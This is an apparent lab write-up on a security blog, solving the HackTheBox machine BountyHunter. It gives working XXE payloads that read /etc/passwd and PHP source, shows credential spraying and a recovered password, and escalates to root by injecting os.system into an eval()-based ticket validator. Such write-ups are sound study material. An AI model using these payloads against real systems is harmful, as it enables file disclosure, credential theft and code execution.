        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/blog/en/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>HackTheBox - BountyHunter</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- images -->



  <!-- add CDN prefix if it exists -->

  

  

  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

  

  <!-- add image placehoder to prevent layout reflow -->

  

  

  
    
      
      
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  

  



<!-- Add header for code snippets -->




<!-- return -->





<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>HackTheBox - BountyHunter</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            The Archivist
          </span>
          
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






  on

<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sun, Oct  3, 2021, 12:00 AM +0800"
  >Oct  3<i class="unloaded">2021-10-03T00:00:00+08:00</i>
</span>

        </div>

        <div>
          <!-- lastmod -->
          
          <span>
            Updated
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago lastmod"
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sun, Oct  3, 2021, 12:00 AM +0800"
  >Oct  3<i class="unloaded">2021-10-03T00:00:00+08:00</i>
</span>

          </span>
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1035 words">5 min
     read</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <p>Today, we are delving into BountyHunter as another HackTheBox machine in our <em>sidetrack</em> series.</p>

<p>I hope you have a nice weekend and without further ado, let us jump right in!</p>

<h2 id="enumeration">Enumeration</h2>

<h3 id="nmap-output">Nmap output</h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span text-data="




    Shell
  
"><i class="fa-fw fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop/HTB/Boxes/BountyHunter]
└─<span class="nv">$ </span><span class="nb">cat </span>nmap/BountyHunter.nmap 
<span class="c"># Nmap 7.91 scan initiated Sat Oct  2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100</span>
Nmap scan report <span class="k">for </span>10.10.11.100
Host is up <span class="o">(</span>0.048s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span class="o">(</span>RSA<span class="o">)</span>
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Bounty Hunters
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></td></tr></tbody></table></code></div></div>

<p>Based on nmap result, Apache and SSH service were running on port 80 and 22, respectively.</p>

<p>The default index shows no conspicuous detail aside from its portal redirecting to a report form.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-34.png" alt="" /></p>

<p>Initially, several XSS/SQLi payloads were tested but displayed incapable of producing any useful result, albeit the input values seemed not to be filtered or sanitized for special characters.</p>

<h2 id="exploitation">Exploitation</h2>

<h3 id="xml-eternal-entity">XML Eternal Entity</h3>

<p>As the above solution is not possible, let us use BurpSuite to intercept requests and get a closer look.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-46.png" alt="" /></p>

<p>From here you can tell that the value of <code class="language-plaintext highlighter-rouge">data</code> field is encoded, so I prefer using  <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, a powerful yet simple utility, to analyze and decode it.</p>

<p>Our recipe consists of <strong>URL Decode</strong> and <strong>From Base64</strong>, sequentially.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-48.png" alt="Using Cyberchef to decode" /></p>

<p>The output is of XML and thereby allowing us to interfere and view files on the target server filesystem as well as other back-end sources or external entities that the server itself can access. This is an XXE injection, a type of attack against an application that parses XML input.</p>

<p>You can read more about XXE <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">here</a>.</p>

<p>Thanks to that, we can make an attempt to trigger the XXE vulnerability. The following payload includes and shows us the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> on the server.</p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span text-data="




    XML
  
"><i class="fa-fw fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [
  &lt;!ELEMENT foo ANY &gt;</span>
  <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span>]&gt;
		<span class="nt">&lt;bugreport&gt;</span>
		<span class="nt">&lt;title&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;cwe&gt;</span>x<span class="nt">&lt;/cwe&gt;</span>
		<span class="nt">&lt;cvss&gt;</span>x<span class="nt">&lt;/cvss&gt;</span>
		<span class="nt">&lt;reward&gt;</span>aaaa&gt;<span class="nt">&lt;/reward&gt;</span>
		<span class="nt">&lt;/bugreport&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>And the return is:</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-50.png" alt="" /></p>

<p>In case the <code class="language-plaintext highlighter-rouge">expect://</code> module is available on the target server then you can craft your payload as below and actually get RCE.</p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span text-data="




    XML
  
"><i class="fa-fw fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [
  &lt;!ELEMENT foo ANY &gt;</span>
  <span class="cp">&lt;!ENTITY xxe SYSTEM "expect://ls" &gt;</span>]&gt; <span class="c">&lt;!-- execute "ls" command --&gt;</span>
		<span class="nt">&lt;bugreport&gt;</span>
		<span class="nt">&lt;title&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;cwe&gt;</span>x<span class="nt">&lt;/cwe&gt;</span>
		<span class="nt">&lt;cvss&gt;</span>x<span class="nt">&lt;/cvss&gt;</span>
		<span class="nt">&lt;reward&gt;</span>aaaa&gt;<span class="nt">&lt;/reward&gt;</span>
		<span class="nt">&lt;/bugreport&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Unfortunately, the result is just four empty fields, which indicates that <code class="language-plaintext highlighter-rouge">expect://</code> is not loaded or this is a blind injection. Not really matter, though.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-51.png" alt="" /></p>

<p>We still have another solution of using a PHP wrapper to retrieve back-end files on the server. If you still remember, we have already <a href="https://legiahuyy.github.io/blog/en/RFI-Wrapper/">used it</a> in one of my university challenges.</p>

<p>So our new payload is as following:</p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span text-data="




    XML
  
"><i class="fa-fw fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [
  &lt;!ELEMENT foo ANY &gt;</span>
  <span class="cp">&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" &gt;</span>]&gt;
		<span class="nt">&lt;bugreport&gt;</span>
		<span class="nt">&lt;title&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;cwe&gt;</span>x<span class="nt">&lt;/cwe&gt;</span>
		<span class="nt">&lt;cvss&gt;</span>x<span class="nt">&lt;/cvss&gt;</span>
		<span class="nt">&lt;reward&gt;</span>aaaa&gt;<span class="nt">&lt;/reward&gt;</span>
		<span class="nt">&lt;/bugreport&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It reads and encodes <code class="language-plaintext highlighter-rouge">index.php</code> on the server to a base64 string.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-58.png" alt="" /></p>

<p>Yet it is just some HTML and CSS, nothing special so I have <code class="language-plaintext highlighter-rouge">gobuster</code> enumerating <code class="language-plaintext highlighter-rouge">.php</code> and other sensitive extensions.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-01.png" alt="db.php" /></p>

<p>After retrieving <code class="language-plaintext highlighter-rouge">db.php</code> and decoding the content, we have some credentials.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-04.png" alt="" /></p>

<p>But neither <code class="language-plaintext highlighter-rouge">test</code> nor <code class="language-plaintext highlighter-rouge">admin</code> was a valid username for SSH login, so I try looking for another user with console on the server system by searching for <code class="language-plaintext highlighter-rouge">/bin/bash</code> or <code class="language-plaintext highlighter-rouge">/home/(username)</code> in the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-08.png" alt="" /></p>

<p>There are just <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">Development</code>.</p>

<h3 id="credentials-spraying-with-cme">Credentials spraying with CME</h3>

<p>In this step, CrackMapExec (CME) should be able to help us get into the server internal. In order to work, CME needs two files containing all usernames and passwords (i.e, <code class="language-plaintext highlighter-rouge">user.txt</code> and <code class="language-plaintext highlighter-rouge">pass.txt</code>).</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-16.png" alt="" /></p>

<p>And the valid credentials are: <code class="language-plaintext highlighter-rouge">development:m19RoAU0hP41A1sTsq6K</code>.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-18.png" alt="" /></p>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<p>To know whether <code class="language-plaintext highlighter-rouge">development</code> user is capable of executing command as superuser or not, try <code class="language-plaintext highlighter-rouge">$ sudo -l</code>:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span text-data="




    Shell
  
"><i class="fa-fw fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>development@bountyhunter:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>development on
    bountyhunter:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User development may run the following commands on
        bountyhunter:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/python3.8
        /opt/skytrain_inc/ticketValidator.py

</pre></td></tr></tbody></table></code></div></div>

<p>As can be seen, <code class="language-plaintext highlighter-rouge">development</code> can execute <code class="language-plaintext highlighter-rouge">/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code> as root without password.</p>

<h3 id="eval--evil">Eval() == Evil</h3>

<p>Reading <code class="language-plaintext highlighter-rouge">/opt/skytrain_inc/ticketValidator.py</code> source.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span text-data="




    Python

"><i class="fa-fw fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre></td><td class="rouge-code"><pre><span class="c1">#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.
</span>
<span class="k">def</span> <span class="nf">load_file</span><span class="p">(</span><span class="n">loc</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">loc</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">".md"</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">loc</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Wrong file type."</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">evaluate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">):</span>
    <span class="c1">#Evaluates a ticket to check for ireggularities.
</span>    <span class="n">code_line</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">x</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">.</span><span class="n">readlines</span><span class="p">()):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"# Skytrain Inc"</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">continue</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"## Ticket to "</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Destination: </span><span class="si">{</span><span class="s">' '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">3</span><span class="p">:])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"__Ticket Code:__"</span><span class="p">):</span>
            <span class="n">code_line</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">code_line</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">==</span> <span class="n">code_line</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"**"</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="n">ticketCode</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"+"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">ticketCode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">))</span>
                <span class="k">if</span> <span class="n">validationNumber</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">True</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">fileName</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Please enter the path to the ticket file.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">ticket</span> <span class="o">=</span> <span class="n">load_file</span><span class="p">(</span><span class="n">fileName</span><span class="p">)</span>
    <span class="c1">#DEBUG print(ticket)
</span>    <span class="n">result</span> <span class="o">=</span> <span class="n">evaluate</span><span class="p">(</span><span class="n">ticket</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Valid ticket."</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Invalid ticket."</span><span class="p">)</span>
    <span class="n">ticket</span><span class="p">.</span><span class="n">close</span>

<span class="n">main</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>Code breakdown:</p>

<p><code class="language-plaintext highlighter-rouge">load_file</code> checks whether the file extension is <code class="language-plaintext highlighter-rouge">.md</code> or not.</p>

<p><code class="language-plaintext highlighter-rouge">evaluate</code></p>

<ul>
  <li>returns <code class="language-plaintext highlighter-rouge">False</code> whether the first line doesn’t start with <code class="language-plaintext highlighter-rouge"># Skytrain Inc</code> or <code class="language-plaintext highlighter-rouge">## Ticket to</code>; otherwise, prints the destination and continues.</li>
  <li>reads the string below “__Ticket Code:__”, removes (**) and thereafter assigns the number before the (+) operator as<code class="language-plaintext highlighter-rouge">ticketCode</code>.</li>
  <li>Executes the following string as code whether the modulo of <code class="language-plaintext highlighter-rouge">ticketCode</code> and 7 is 4.</li>
</ul>

<p>Hence, our <code class="language-plaintext highlighter-rouge">root_ticket.md</code>:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span text-data="




    Shell
  
"><i class="fa-fw fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre> Skytrain Inc
<span class="c">## Ticket to New Haven</span>
__Ticket Code:__
<span class="k">**</span>32+100 and __import__<span class="o">(</span><span class="s1">'os'</span><span class="o">)</span>.system<span class="o">(</span><span class="s1">'cat /root/root.txt'</span><span class="o">)</span>
<span class="c">##Issued: 2021/10/03</span>
<span class="c">#End Ticket</span>
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_17-13.png" alt="" /></p>



      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        

        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/blog/en/categories/hackthebox/'>hackthebox</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/blog/en/tags/hackthebox/"
            class="post-tag no-text-decoration" >hackthebox</a>
          
          <a href="/blog/en/tags/network/"
            class="post-tag no-text-decoration" >network</a>
          
          <a href="/blog/en/tags/pwn/"
            class="post-tag no-text-decoration" >pwn</a>
          
          <a href="/blog/en/tags/machine/"
            class="post-tag no-text-decoration" >machine</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          <div class="license-wrapper">
          
            
            This post is licensed under 
            <a href="https://creativecommons.org/licenses/by/4.0/">
              CC BY 4.0
            </a>
             by the author.
          
          </div>

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=HackTheBox - BountyHunter - Another infosec blog&url=https://legiahuyy.github.io/blog/en/posts/HTB-BountyHunter/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - BountyHunter - Another infosec blog&u=https://legiahuyy.github.io/blog/en/posts/HTB-BountyHunter/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=HackTheBox - BountyHunter - Another infosec blog&url=https://legiahuyy.github.io/blog/en/posts/HTB-BountyHunter/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->





<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

    <div id="access-lastmod" class="post">
      <span>Recent Update</span>
      <ul class="post-content pl-0 pb-1 ml-1 mt-2">

      
        
        
        
        <li><a href="/blog/en/posts/HTB-BountyHunter/">HackTheBox - BountyHunter</a></li>
      
        
        
        
        <li><a href="/blog/en/posts/HTB-Cap/">HackTheBox - Cap</a></li>
      
        
        
        
        <li><a href="/blog/en/posts/PRE-C1-E1/">PRE Solutions Series: First Chapter</a></li>
      
        
        
        
        <li><a href="/blog/en/posts/Update-Note/">Update.txt</a></li>
      
        
        
        
        <li><a href="/blog/en/posts/HTB-Armageddon/">HackTheBox - Armageddon</a></li>
      

      </ul>
    </div> <!-- #access-lastmod -->

  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/blog/en/tags/pwn/">pwn</a>
      
        
        <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag" href="/blog/en/tags/network/">network</a>
      
        
        <a class="post-tag" href="/blog/en/tags/kma/">kma</a>
      
        
